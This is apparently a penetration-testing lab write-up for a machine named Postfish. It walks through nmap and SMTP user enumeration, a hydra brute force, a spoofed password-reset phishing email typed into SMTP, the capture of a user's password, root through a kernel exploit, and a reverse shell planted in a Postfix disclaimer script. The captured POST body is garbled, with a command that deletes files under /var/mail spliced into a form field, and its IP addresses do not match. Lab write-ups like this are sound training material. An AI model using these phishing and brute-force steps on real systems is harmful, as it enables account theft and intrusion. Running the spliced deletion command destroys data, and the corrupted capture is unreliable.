## Initial Foothold

Autorecon `192.168.228.137`
```
PORT    STATE SERVICE REASON         VERSION
22/tcp  open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
25/tcp  open  smtp    syn-ack ttl 61 Postfix smtpd
|_-----END CERTIFICATE-----
|_smtp-commands: postfish.off, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
80/tcp  open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
110/tcp open  pop3    syn-ack ttl 61 Dovecot pop3d
|_pop3-capabilities: STLS CAPA USER UIDL RESP-CODES TOP PIPELINING SASL(PLAIN)
143/tcp open  imap    syn-ack ttl 61 Dovecot imapd (Ubuntu)
993/tcp open  imaps?  syn-ack ttl 61
995/tcp open  pop3s?  syn-ack ttl 61
```
Ports
- 110/995 (pop3) - I still don't really know how to enumerate pop3
```
┌──(kali㉿kali)-[~/offsec/postfish]
└─$ nmap --script "pop3-ntlm-info" -sV -p 110,995 192.168.228.137
PORT    STATE SERVICE VERSION
110/tcp open  pop3    Dovecot pop3d
995/tcp open  pop3s? 
┌──(kali㉿kali)-[~/offsec/postfish]
└─$ nmap --script "pop3-capabilities" -sV -p 110,995 192.168.228.137
PORT    STATE SERVICE VERSION
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: USER TOP STLS AUTH-RESP-CODE SASL(PLAIN) UIDL RESP-CODES PIPELINING CAPA
995/tcp open  pop3s?
|_pop3-capabilities: SASL(PLAIN) USER AUTH-RESP-CODE PIPELINING UIDL CAPA TOP RESP-CODES
```
- 25 (smtp). `postfish.off` suspicious
```
┌──(kali㉿kali)-[~/offsec/postfish]
└─$ nmap -p25 --script smtp-commands 192.168.228.137
PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-commands: postfish.off, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING

┌──(kali㉿kali)-[~/offsec/postfish]
└─$ nmap -p25 -v --script smtp-open-relay 192.168.228.137
PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-open-relay: Server doesn't seem to be an open relay, all tests failed
```
- 80 (web). `192.168.228.137` redirects to postfish.off. Add it to /etc/hosts.
Nothing interesting. It's a webpage with an IT team and their names. `view-source:http://postfish.off/team.html`
```
Jane:Claire Madison:HR Specialist  
Mike:Mike Ross:IT Pro  
John:Brian Moore:Sales Manager  
talya:Sarah Lorem:Legal Advisor
```

Create a `users.txt` list.
```
root
admin
jane
mike
john
Talya
claire madison
mike ross
brian moore
sarah lorem
claire
madison
mike
ross
brian
moore
sarah
lorem
Jane
Mike
John
talya
Claire Madison
Mike Ross
Brian Moore
Sarah Lorem
Claire
Madison
Mike
Ross
Brian
Moore
Sarah
Lorem
hr
it
sales
legal
specialist
pro
manager
advisor
hr specialist
it pro
sales manager
legal advisor
```

Use `smtp-user-enum` against the list of users we digged up
```
┌──(kali㉿kali)-[~/offsec/postfish]
└─$ smtp-user-enum -M VRFY -U users.txt -t postfish.off  
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... users.txt
Target count ............. 1
Username count ........... 46
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Wed Nov 25 03:27:47 2026 #########
postfish.off: root exists
postfish.off: hr exists
postfish.off: it exists
postfish.off: sales exists
postfish.off: legal exists
######## Scan completed at Wed Nov 25 03:27:47 2026 #########
5 results.
```

Saw online that if we run usernamer.py and add them to our user.txt file to test, we could get 4 more hits 
```
???(root?kali)-[/home/kali]  
??# python2 usernamer.py -n 'brian moore' >> smtp_usernames.txt???(root?kali)-[/home/kali]  
??# python2 usernamer.py -n 'sarah lorem' >> smtp_usernames.txt???(root?kali)-[/home/kali]  
??# python2 usernamer.py -n 'claire madison' >> smtp_usernames.txt???(root?kali)-[/home/kali]  
??# python2 usernamer.py -n 'mike ross' >> smtp_usernames.txt

## Hits
brian.moore@postfish.off  
sarah.lorem@postfish.off  
claire.madison@postfish.off  
mike.ross@postfish.off
```

Cewl a password list from the team page.
```
┌──(kali㉿kali)-[~/offsec/postfish]
└─$ cewl http://postfish.off/team.html -d 4 -m 5 --with-numbers -w  cewl1.txt
CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```

Then run it against hydra against pop3. Did not return anything.
```
hydra -L updatedusers.txt -P cewl1.txt 192.168.228.137 pop3 -V -f
```

Try with a lowercase cewl list
```
tr A-Z a-z < cewl1.txt > cewl2.txt
hydra -L updatedusers.txt -P cewl2.txt 192.168.228.137 pop3 -V -f
[110][pop3] host: 192.168.228.137   login: sales   password: sales
[STATUS] attack finished for 192.168.228.137 (valid pair found)
```

Login to pop3 through telnet.
```
┌──(kali㉿kali)-[~/offsec/postfish]
└─$ telnet 192.168.228.137 110
Trying 192.168.228.137...
Connected to 192.168.228.137.
Escape character is '^]'.
+OK Dovecot (Ubuntu) ready.
USER sales
+OK
PASS sales

+OK Logged in.
-ERR Unknown command: 
list 
+OK 1 messages:
1 683
.
retr 1
+OK 683 octets
Return-Path: <it@postfish.off>
X-Original-To: sales@postfish.off
Delivered-To: sales@postfish.off
Received: by postfish.off (Postfix, from userid 997)
        id B277B45445; Wed, 31 Mar 2021 13:14:34 +0000 (UTC)
Received: from x (localhost [127.0.0.1])
        by postfish.off (Postfix) with SMTP id 7712145434
        for <sales@postfish.off>; Wed, 31 Mar 2021 13:11:23 +0000 (UTC)
Subject: ERP Registration Reminder
Message-Id: <20210331131139.7712145434@postfish.off>
Date: Wed, 31 Mar 2021 13:11:23 +0000 (UTC)
From: it@postfish.off

Hi Sales team,

We will be sending out password reset links in the upcoming week so that we can get you registered on the ERP system.

Regards,
IT
.
```

The email indicates the IT team `(it@postfish.off)` will be sending password reset links to the sales team. From here we can potentially spear phish someone.

Send an email to `brian.moore@postfish.off`. Open listening port at port 80.
```
nc -v postfish.off 25
postfish.off [192.168.228.137] 25 (smtp) open
220 postfish.off ESMTP Postfix (Ubuntu)
helo test ## test
250 postfish.off
MAIL FROM: it@postfish.off ## COPY THIS
250 2.1.0 Ok
RCPT TO: brian.moore@postfish.off ## COPY THIS
250 2.1.5 Ok
DATA                              ## COPY THIS
354 End data with <CR><LF>.<CR><LF>
Subject: Password reset process   ## COPY THIS UNTIL THE END DOT

Hi Brian,

Please follow this link to reset your password: http://192.168.45.212/                              

Regards,

.
250 2.0.0 Ok: queued as 7FA9E414BF
QUIT
221 2.0.0 Bye
```

```
POST / HTTP/1.1  
Host: 192.168.58.200  
User-Agent: curl/7.68.0  
Accept: */*  
Content-Length: 207  
Content-Type: application/x-www-form-urlencodedfirst_name%3DBrian%26last_name%3DMoore%26email%3Dbrian.moore%postfish.off%26username%3Dbrian.moore%26password%3DEternaLSunshinE%26confifind /var/mail/ -type f ! -name sales -delete_password%3DEternaLSunshinE
```

got credentials `brian.moore:EternaLSunshinE`

## Privesc
- `sudo -l` - Sorry, user brian.moore may not run sudo on postfish.
- Check SUID - nothing interesting. pkexec but pwnkit failed
- Check capabilities - nothing

Ran linpeas.sh. Apparently this is weak against dirtyfrag and maybe weak against copyfail. Ran dirtyfrag. Got root.

## Alternative:
`https://medium.com/@whitebearr82/pgpractice-linux-postfish-192-168-56-137-9a48d8577c5f`
`https://viperone.gitbook.io/pentest-everything/writeups/pg-practice/linux/postfish`
It seems that brian.moore belongs to a non-default group **filter**.
As we are a member the group 'filter' we can edit the script `/etc/postfix/disclaimer`,
using nano to edit the script I inserted a bash reverse shell to the top of the script.

Then like we did earlier I connected to SMTP with `netcat` and sent an email to trigger the shell.
